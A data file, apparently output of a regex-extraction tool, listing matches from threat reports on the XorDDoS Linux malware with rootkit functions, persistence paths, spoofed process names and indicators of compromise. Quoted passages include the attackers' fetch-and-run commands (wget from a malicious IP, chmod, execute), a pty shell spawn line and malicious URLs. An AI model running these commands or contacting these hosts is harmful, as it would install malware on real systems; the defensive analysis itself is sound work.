@@ -1,0 +1,490 @@
+report,regex,matched word,sentence number,sentence
+Xorddos-Cdnetworks,UID,"guide,",5,"in many ways it is and in this guide, we will provide an analysis of xor.ddos and how to counteract it."
+Xorddos-Intezer,"permission:{0,1}[0-9]{0,4}","permission,",36,"the file’s data used in both functions are: path, name, type, user, permission, size, time."
+Xorddos-Intezer,UID,uid,41,figure 3: similarity between pwnlnx and redxor of the uid and gid used with “lchown” function call
+Xorddos-Intezer,GID,gid,41,figure 3: similarity between pwnlnx and redxor of the uid and gid used with “lchown” function call
+Xorddos-Intezer,/etc/rc,/etc/rc2.d/s99po1kitd-update,65,"the following files are created after executing the malware on boot:
+/usr/syno/etc/rc.d/s99po1kitd-update.sh
+/etc/init.d/po1kitd-update
+/etc/rc2.d/s99po1kitd-update
+the malware checks if the rootkit is active by creating a file and removing it."
+Xorddos-Intezer,/etc/init.d/,/etc/init.d/po1kitd-update,65,"the following files are created after executing the malware on boot:
+/usr/syno/etc/rc.d/s99po1kitd-update.sh
+/etc/init.d/po1kitd-update
+/etc/rc2.d/s99po1kitd-update
+the malware checks if the rootkit is active by creating a file and removing it."
+Xorddos-Intezer,/proc/,/proc/meminfo,110,"table 2: data collected by the malware and sent back to the c2 server
+url key	description	comment
+hostip	ip	hardcoded to 127.0.0.1
+softtype		hardcoded to “linux”
+pscaddr	mac address	
+hostname	machine name	
+hosttar	username	possibly “host target”
+hostos	distribution	extracted from /etc/issue or /etc/redhat-release
+hostcpu	clock speed	/proc/cpuinfo
+hostmem	amount of memory	/proc/meminfo
+hostpack		hardcoded to “linux”
+lkmtag	is rootkit enabled	
+kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2."
+Xorddos-Intezer,"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",127.0.0.1,110,"table 2: data collected by the malware and sent back to the c2 server
+url key	description	comment
+hostip	ip	hardcoded to 127.0.0.1
+softtype		hardcoded to “linux”
+pscaddr	mac address	
+hostname	machine name	
+hosttar	username	possibly “host target”
+hostos	distribution	extracted from /etc/issue or /etc/redhat-release
+hostcpu	clock speed	/proc/cpuinfo
+hostmem	amount of memory	/proc/meminfo
+hostpack		hardcoded to “linux”
+lkmtag	is rootkit enabled	
+kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2."
+Xorddos-Intezer,bin/,“/bin/sh”.,125,"if a shell is requested via the command code 3000, the malware creates a new thread executing “/bin/sh”."
+Xorddos-Intezer,bin/,pty;pty.spawn(‘/bin/sh’)”,126,"in the new spawned shell, the malware executes python -c “import pty;pty.spawn(‘/bin/sh’)” to get a pseudo-terminal (pty) interface."
+Xorddos-Intezer,"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",34.92.228.216,148,"network
+update.cloudjscdn.com 158.247.208.230 34.92.228.216
+process name
+po1kitd-update-k"
+Xorddos-Microsoft,bin/,/bin/good,35,"in this case, it renames the wget binary to good and moves the file to the following locations:
+mv /usr/bin/wget /usr/bin/good
+mv /bin/wget /bin/good
+attempts to download the elf file payload for a second time, now only using the file good and not the wget binary."
+Xorddos-Microsoft,bin/,/bin/,85,"encrypted strings	decoded value
+m7a4nq_/na	/usr/bin/
+m [(n3	/bin/
+m6_6n3	/tmp/
+m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid
+m.[$n__#4%\c\x1ab]0	/lib/libudev.so
+m.[$n3	/lib/
+m4s4nac/na	/var/run/
+!#ff3ve.-7\x17v[_	cat resolv.conf
+<encrypted_remote_url>	hxxp://aa.hostasa[."
+Xorddos-Microsoft,resolv.conf,resolv.conf,85,"encrypted strings	decoded value
+m7a4nq_/na	/usr/bin/
+m [(n3	/bin/
+m6_6n3	/tmp/
+m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid
+m.[$n__#4%\c\x1ab]0	/lib/libudev.so
+m.[$n3	/lib/
+m4s4nac/na	/var/run/
+!#ff3ve.-7\x17v[_	cat resolv.conf
+<encrypted_remote_url>	hxxp://aa.hostasa[."
+Xorddos-Microsoft,resolv.conf,resolv.conf.,87,"to spoof its process name, xorddos zeroes out all argument buffers while running and overrides its first argument buffer containing the image path with a fake command line, such as cat resolv.conf."
+Xorddos-Microsoft,resolv.conf,resolv.conf.,91,screenshot of the output of the 'ps -aef' containing an entry for cat resolv.conf.
+Xorddos-Microsoft,resolv.conf,resolv.conf”,92,figure 8. output of the ‘ps -aef’ contains an entry for “cat resolv.conf”
+Xorddos-Microsoft,/proc/,/proc/net/tcp6,110,"the following table describes the symbols found in the rootkit and their corresponding functionalities:
+
+function name  	description  
+give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”
+module_hide	hides the rootkit kernel module
+module_show	unhides the rootkit kernel module
+get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6
+get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6
+hide_udp4_port	adds a provided port to a list of hidden udp4 ports
+unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports
+hide_udp6_port	adds a provided port to a list of hidden udp6 ports
+unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports
+hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports
+unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports
+hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports
+unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports
+unhide_allz	iterates list of all hidden ports and deletes all entries
+firewall_acceptip	adds an ip address provided to accept_ips list
+unfirewall_acceptip	deletes a provided entry from accept_ips list
+firewall_dropip	adds a provided ip address to drop_ips list
+unfirewall_dropip	deletes a provided ip address to drop_ips list
+hide_proc	adds a provided entry to hidden_procs list
+unhide_proc	deletes a provided entry to hidden_procs list"
+Xorddos-Microsoft,UID,"uid,",110,"the following table describes the symbols found in the rootkit and their corresponding functionalities:
+
+function name  	description  
+give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”
+module_hide	hides the rootkit kernel module
+module_show	unhides the rootkit kernel module
+get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6
+get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6
+hide_udp4_port	adds a provided port to a list of hidden udp4 ports
+unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports
+hide_udp6_port	adds a provided port to a list of hidden udp6 ports
+unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports
+hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports
+unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports
+hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports
+unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports
+unhide_allz	iterates list of all hidden ports and deletes all entries
+firewall_acceptip	adds an ip address provided to accept_ips list
+unfirewall_acceptip	deletes a provided entry from accept_ips list
+firewall_dropip	adds a provided ip address to drop_ips list
+unfirewall_dropip	deletes a provided ip address to drop_ips list
+hide_proc	adds a provided entry to hidden_procs list
+unhide_proc	deletes a provided entry to hidden_procs list"
+Xorddos-Microsoft,GID,gid,110,"the following table describes the symbols found in the rootkit and their corresponding functionalities:
+
+function name  	description  
+give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”
+module_hide	hides the rootkit kernel module
+module_show	unhides the rootkit kernel module
+get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6
+get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6
+hide_udp4_port	adds a provided port to a list of hidden udp4 ports
+unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports
+hide_udp6_port	adds a provided port to a list of hidden udp6 ports
+unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports
+hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports
+unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports
+hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports
+unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports
+unhide_allz	iterates list of all hidden ports and deletes all entries
+firewall_acceptip	adds an ip address provided to accept_ips list
+unfirewall_acceptip	deletes a provided entry from accept_ips list
+firewall_dropip	adds a provided ip address to drop_ips list
+unfirewall_dropip	deletes a provided ip address to drop_ips list
+hide_proc	adds a provided entry to hidden_procs list
+unhide_proc	deletes a provided entry to hidden_procs list"
+Xorddos-Microsoft,/proc/,/proc/$pid,114,"a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:
+
+/proc/7728 – contains process-id (pid) 7728-related information
+/proc/698 – contains pid 698-related information
+running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command."
+Xorddos-Microsoft,/proc/,"open(“/proc/5978/status”,",115,"> strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode."
+Xorddos-Microsoft,/proc/,/proc/rs_dev,116,"in this case, the malware has a provision for communicating with its rootkit component /proc/rs_dev by sending input and output control (ioctl) calls with additional information to take appropriate action."
+Xorddos-Microsoft,/proc/,/proc/net,124,the /proc/net interface provides information about currently active tcp connections and is implemented by kernel apis tcp4_seq_show() and tcp6_seq_show() .
+Xorddos-Microsoft,/proc/,/proc/net/udp.,125,"utilities, such as netstat, acquire tcp/udp connection information from files named /proc/net/tcp and /proc/net/udp."
+Xorddos-Microsoft,/proc/,"/proc/net/udp6,",128,"the following table lists kernel apis and their hook names used by the rootkit:
+
+kernel api	hooked function by rootkit	function description
+tcp4_seq_show()	n_tcp4_seq_show()	hiding /proc/net/tcp, tcpv4 connection
+tcp6_seq_show()	n_tcp6_seq_show()	hiding /proc/net/tcp6, tcpv6 connection
+udp4_seq_show()	n_ udp4_seq_show()	hiding /proc/net/udp, udpv4 connection
+udp6_seq_show()	n_ udp6_seq_show()	hiding /proc/net/udp6, udpv4 connection
+persistence mechanisms
+xorddos uses various persistence mechanisms to support different linux distributions when automatically launching upon system startup, as detailed below."
+Xorddos-Microsoft,/etc/init.d/,/etc/init.d/hflggwyfsc.elf.,132,screenshot of the content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf.
+Xorddos-Microsoft,/etc/init.d/,/etc/init.d/hflggwyfsc.elf,133,figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf
+Xorddos-Microsoft,/etc/rc,/etc/rc<run_level>,142,"the /etc/rc<run_level> directory contains symbolic links (symlinks), which are soft links that point to the original file."
+Xorddos-Microsoft,/etc/rc,/etc/rc.d/rc<run_level>.d/s90<base_file_name>.,144,the malware creates a symlink for the init script dropped at the location /etc/init.d/<base_file_name> with the directories associated with runlevels 1 through 5 at /etc/rc<run_level>.d/s90<base_file_name> and /etc/rc.d/rc<run_level>.d/s90<base_file_name>.
+Xorddos-Microsoft,/etc/init.d/,/etc/init.d/<base_file_name>,144,the malware creates a symlink for the init script dropped at the location /etc/init.d/<base_file_name> with the directories associated with runlevels 1 through 5 at /etc/rc<run_level>.d/s90<base_file_name> and /etc/rc.d/rc<run_level>.d/s90<base_file_name>.
+Xorddos-Microsoft,/etc/init.d/,/etc/init.d/<base_file_name>.,145,screenshot displaying the installation of rc.d directory's symlink scripts with /etc/init.d/<base_file_name>.
+Xorddos-Microsoft,/etc/init.d/,/etc/init.d/<base_file_name>,146,"figure 15. installation of rc.d directory’s symlink scripts with /etc/init.d/<base_file_name>
+auto-start services
+
+the malware runs a command to install startup services that automatically run xorddos at boot."
+Xorddos-Microsoft,/proc/,/proc/self/exe,152,"before handling the argument-based control, it calls the readlink api with the first parameter as /proc/self/exe to fetch its full process path."
+Xorddos-Microsoft,bin/,"/bin/,",155,"the malware first checks whether it’s running from the locations /usr/bin/, /bin/, or /tmp/."
+Xorddos-Microsoft,bin/,/usr/bin/jwvwvxoupv,160,"2: clean-up code path
+
+in this code path, the malware runs with another argument provided as the pid, for example:
+
+/usr/bin/jwvwvxoupv 4849
+using the above example, the malware shares the 64-byte size memory segment with the ipc key “0xda718716” to check for another malware process provided as an argument."
+Xorddos-Microsoft,0x[0-9a-zA-Z]{8},“0xda718716”,160,"2: clean-up code path
+
+in this code path, the malware runs with another argument provided as the pid, for example:
+
+/usr/bin/jwvwvxoupv 4849
+using the above example, the malware shares the 64-byte size memory segment with the ipc key “0xda718716” to check for another malware process provided as an argument."
+Xorddos-Microsoft,/etc/rc,/etc/rc<runlevel>.d/s90<file_name>,163,"additionally, it performs the following tasks on a provided $pid:
+
+fetches the process file name corresponding to the provided $pid
+deletes the file for the provided $pid
+deletes the installed init services:
+deletes /etc/init.d/<file_name>
+for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name>
+performs the command chkconfig –del <file_name>
+performs the command update-rc.d <file_name> remove
+ends the process that was provided as an argument."
+Xorddos-Microsoft,/etc/init.d/,/etc/init.d/<file_name>,163,"additionally, it performs the following tasks on a provided $pid:
+
+fetches the process file name corresponding to the provided $pid
+deletes the file for the provided $pid
+deletes the installed init services:
+deletes /etc/init.d/<file_name>
+for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name>
+performs the command chkconfig –del <file_name>
+performs the command update-rc.d <file_name> remove
+ends the process that was provided as an argument."
+Xorddos-Microsoft,bin/,/usr/bin/kagbjahdic,164,"3: process name spoofing code path
+
+the malware spawns new dropped binaries with two additional arguments: a fake command line and its pids, for example:
+
+/usr/bin/jwvwvxoupv “cat resolv.conf” 4849
+/usr/bin/jwvwvxoupv gnome-terminal 4849
+/usr/bin/jwvwvxoupv top 4849
+/usr/bin/jwvwvxoupv pwd 4849
+/usr/bin/kagbjahdic id 4849"
+Xorddos-Microsoft,resolv.conf,resolv.conf”,164,"3: process name spoofing code path
+
+the malware spawns new dropped binaries with two additional arguments: a fake command line and its pids, for example:
+
+/usr/bin/jwvwvxoupv “cat resolv.conf” 4849
+/usr/bin/jwvwvxoupv gnome-terminal 4849
+/usr/bin/jwvwvxoupv top 4849
+/usr/bin/jwvwvxoupv pwd 4849
+/usr/bin/kagbjahdic id 4849"
+Xorddos-Microsoft,resolv.conf,resolv.conf,165,"the fake commands can include:
+
+cat resolv.conf
+netstat -an
+bash
+whoami
+id
+cd /etc
+ifconfig eth0
+ifconfig
+echo “find”
+uptime
+sh
+top
+gnome-terminal
+su
+netstat -antop
+grep “a”
+who
+ls -la
+pwd
+route -n
+ps -ef
+ls
+sleep 1"
+Xorddos-Microsoft,^sh$,sh,165,"the fake commands can include:
+
+cat resolv.conf
+netstat -an
+bash
+whoami
+id
+cd /etc
+ifconfig eth0
+ifconfig
+echo “find”
+uptime
+sh
+top
+gnome-terminal
+su
+netstat -antop
+grep “a”
+who
+ls -la
+pwd
+route -n
+ps -ef
+ls
+sleep 1"
+Xorddos-Microsoft,eth[0-9]$,eth0,165,"the fake commands can include:
+
+cat resolv.conf
+netstat -an
+bash
+whoami
+id
+cd /etc
+ifconfig eth0
+ifconfig
+echo “find”
+uptime
+sh
+top
+gnome-terminal
+su
+netstat -antop
+grep “a”
+who
+ls -la
+pwd
+route -n
+ps -ef
+ls
+sleep 1"
+Xorddos-Microsoft,/proc/,/proc/$pid/exe.,168,"it then enters a five-second loop to perform the following checks:
+
+fetches the file name specific to the $pid provided as part of the third argument by calling the readlink api on /proc/$pid/exe."
+Xorddos-Microsoft,bin/,/bin/,174,"if the stat api returns a non-zero value, then it attempts to copy the content of the current process’s image-file fetched earlier to the following locations with a random name:
+/usr/bin/
+/bin/
+/tmp/   
+copies the /lib/libudev.so file to the same three directories listed above if the stat api call is successful on /lib/libudev.so."
+Xorddos-Microsoft,bin/,/bin/,179,"4: known locations code path without any provided arguments
+
+this code path is similar to the standard code path, with the main difference being that the malware runs from one of the following locations:
+
+/usr/bin/
+/bin/
+/tmp/
+once it runs from one of these locations, the malware calls the following functions to perform various tasks:
+
+installsys – this function sets up the rootkit by extracting it under /usr/bin folder using a random name and loading it into the kernel."
+Xorddos-Microsoft,0x[0-9a-zA-Z]{8},0xbb2fa36aaa9541f0.,182,"as mentioned in the xor-based encryption section, the encoded string m7a4nq_/na translates to the folder path /usr/bin when decoded with the multi-byte key 0xbb2fa36aaa9541f0."
+Xorddos-Microsoft,/proc/,/proc/rs_dev,189,xorddos uses /proc/rs_dev character device to communicate with the rootkit.
+Xorddos-Microsoft,/proc/,/proc/rs_dev,191,screenshot of the code where the xorddos binary uses the /proc/rs_dev device handle to access the rootkit.
+Xorddos-Microsoft,/proc/,/proc/rs_dev.,192,figure 20. the rootkit becomes accessible to the xorddos malware by using the device handle /proc/rs_dev.
+Xorddos-Microsoft,/proc/,/proc/rs_dev.,194,xorddos attempts to open /proc/rs_dev.
+Xorddos-Microsoft,0x[0-9a-zA-Z]{8},0xad1473b8).,200,"if the rootkit is active, it uses the owner value “0xad1473b8” and group value “0xad1473b8” to change the ownership of dropped files with the function lchown(<filename>, 0xad1473b8, 0xad1473b8)."
+Xorddos-Microsoft,UID,suid/sgid,246,"events with the following titles indicate threat activity related to xorddos:
+
+the content of libudev.so was collected into libudev.so.6
+bash process performed system information discovery by invoking ifconfig
+gcc.sh was executed after being dropped by hflggwyfsc.elf
+a shell command was executed by crond
+suid/sgid process unix_chkpwd executed
+screenshot of the microsoft 365 defender timeline showing the alert where a suspicious shell command run by crond was dropped from the malicious .elf."
+Xorddos-Microsoft,GID,suid/sgid,246,"events with the following titles indicate threat activity related to xorddos:
+
+the content of libudev.so was collected into libudev.so.6
+bash process performed system information discovery by invoking ifconfig
+gcc.sh was executed after being dropped by hflggwyfsc.elf
+a shell command was executed by crond
+suid/sgid process unix_chkpwd executed
+screenshot of the microsoft 365 defender timeline showing the alert where a suspicious shell command run by crond was dropped from the malicious .elf."
+Xorddos-Microsoft,resolv.conf,resolv.conf,247,"figure 26. microsoft 365 defender timeline with an event on a suspicious shell command run by crond after it was dropped from hflggwyfsc.elf
+hunting queries
+to locate malicious activity related to xorddos activity, run the following advanced hunting queries in microsoft 365 defender or microsoft defender security center:
+
+failed sign-ins
+
+devicelogonevents
+| where initiatingprocessfilename == sshd
+    and actiontype == logonfailed
+| summarize count() by dayofyear = datetime_part(dayofyear, timestamp)
+| sort by dayofyear 
+| render linechart
+creation of the xorddos-specific dropped files
+
+devicefileevents
+| extend fullpath=strcat(folderpath, filename)
+| where fullpath in (/etc/cron.hourly/gcc.sh, /lib/libudev.so.6, /lib/libudev.so, /var/run/gcc.pid)
+command-line of malicious process
+
+deviceprocessevents
+| where processcommandline contains cat resolv.conf"
+Xorddos-Microsoft,/etc/init.d/,/etc/init.d/hflggwyfsc.elf,250,"dropped files
+dropped file path	file type	sha-256
+/etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf
+/etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459
+/lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432
+/run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c
+/usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a
+/usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7
+/usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489
+/usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd
+/usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7
+/usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4
+/tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
+installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25
+/usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea"
+Xorddos-Microsoft,bin/,/usr/bin/zvzvmpqnv,250,"dropped files
+dropped file path	file type	sha-256
+/etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf
+/etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459
+/lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432
+/run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c
+/usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a
+/usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7
+/usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489
+/usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd
+/usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7
+/usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4
+/tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
+installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25
+/usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea"
+Xorddos-Trendmicro,"permission:{0,1}[0-9]{0,4}",permission,15,"there are times that the ds agent doesn’t have permission to the locked file, so make sure that there’s no running process or service of xorddos (random characters), to fully clean this infection."
+Xorddos-Trendmicro,bin/,/bin/{random,21,"installation
+
+this backdoor drops the following files:
+
+/usr/bin/{random 10 characters}
+/bin/{random 10 characters}
+/tmp/{random 10 characters}
+it drops the following copies of itself into the affected system:
+
+/lib/libudev.so
+autostart technique"
+Xorddos-Trendmicro,/etc/rc,/etc/rc.d/rc{1-5}.d/s90{random,27,"creates symbolic links which points to the script in /etc/init.d:
+/etc/rc{1-5}.d/s90{random numbers}
+/etc/rc.d/rc{1-5}.d/s90{random numbers}
+get the magic string value from the file /var/run/gcc.pid
+read the following from its configuration file:
+md5 - checksum of file
+denyip - open communication with an ip
+filename - list of filename
+rmfile - files to remove"
+Xorddos-Trendmicro2,"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+",http://122.51.133.49:10086/vip,15,"afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:
+
+wget http://122.51.133.49:10086/vip –o vip
+chmod 777 vip
+./vip
+the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server."
+Xorddos-Trendmicro2,"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",http://122.51.133.49:10086/vip,15,"afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:
+
+wget http://122.51.133.49:10086/vip –o vip
+chmod 777 vip
+./vip
+the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server."
+Xorddos-Trendmicro2,"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+",http://122.51.133.49:10086/vip,47,"indicators of compromise
+kaiji
+
+file name	sha 256	trend micro pattern detection
+123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a
+linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a
+related urls:
+
+http://62.171.160.189/linux_arm
+http://62.171.160.189/11/123.sh
+xorddos and other malware variants found through the same url
+
+sha 256	trend micro pattern detection
+dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae
+6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab
+286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a
+related url:
+
+http://122.51.133.49:10086/vip"
+Xorddos-Trendmicro2,"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",http://122.51.133.49:10086/vip,47,"indicators of compromise
+kaiji
+
+file name	sha 256	trend micro pattern detection
+123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a
+linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a
+related urls:
+
+http://62.171.160.189/linux_arm
+http://62.171.160.189/11/123.sh
+xorddos and other malware variants found through the same url
+
+sha 256	trend micro pattern detection
+dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae
+6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab
+286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a
+related url:
+
+http://122.51.133.49:10086/vip"
